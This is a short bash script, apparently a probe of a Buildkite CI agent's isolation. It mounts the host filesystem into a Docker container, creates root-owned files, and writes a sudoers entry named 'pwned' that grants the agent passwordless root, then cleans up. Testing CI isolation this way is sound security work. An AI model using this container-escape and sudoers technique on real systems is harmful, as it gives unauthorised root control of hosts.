#!/usr/bin/env bash

set -euo pipefail

run-as-root() {
  docker run --userns=host -v /:/mnt/host -w /mnt/host alpine:latest "$@"
}

echo ~~~ Creating file as root
run-as-root touch file-created-as-root

echo +++ Checking /
ls -lA /

echo ~~~ Cleaning up
run-as-root rm file-created-as-root

echo +++ Checking /
ls -lA /

echo +++ Checking /etc
ls -lA /etc
run-as-root ls -lA /etc/sudoers.d

echo +++ Testing sudo
if sudo --non-interactive whoami; then
  echo "sudo succeeded"
else
  echo "sudo failed"
fi

echo --- Modifying sudoers
run-as-root echo "'buildkite-agent ALL=(ALL) NOPASSWD: ALL'" > /chroot/etc/sudoers.d/pwned

echo +++ Testing sudo
if sudo --non-interactive whoami; then
  echo "sudo succeeded"
else
  echo "sudo failed"
fi

echo --- Cleaning up
run-as-root rm -f /chroot/etc/sudoers.d/pwned
